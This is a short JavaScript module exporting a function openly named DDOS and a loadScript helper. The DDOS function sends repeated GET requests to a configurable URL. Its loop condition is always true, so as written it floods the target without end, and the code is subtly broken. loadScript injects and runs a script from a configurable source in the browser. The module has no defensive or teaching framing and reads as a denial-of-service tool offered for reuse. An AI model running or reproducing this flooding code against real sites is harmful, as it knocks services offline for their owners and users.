function DDOS() {
	var i, request;

	// creates a thousand requests
	//
	// accepts two configurations:
	//  - times (to send a request)
	//  - url (that is being requested)
	for (i = 0; i < this.data.times || 1000; i++) {
		request = new XMLHttpRequest();
		request.open('GET', this.data.url);
		request.onerror = this.fail;
		request.send();
	}
}

// loads a script into a browser
// requires
function loadScript(browser, done) {
	if (browser.platform.name === 'Node.js') {
		this.fail(
			'loadScript was used on a server. ' +
			'Only browsers are supported.'
		);
	}
	// by using the `done` param,
	// you're indicating this is async.
	var script = document.createElement('script');
	script.src = this.data.src;

	// when it loads, you're done
	script.onload = done;

	// if it fails, send a message
	script.onerror = this.fail;
	document.body.appendChild(script);
}

module.exports = {
	loadScript: loadScript,
	DDOS: DDOS
};
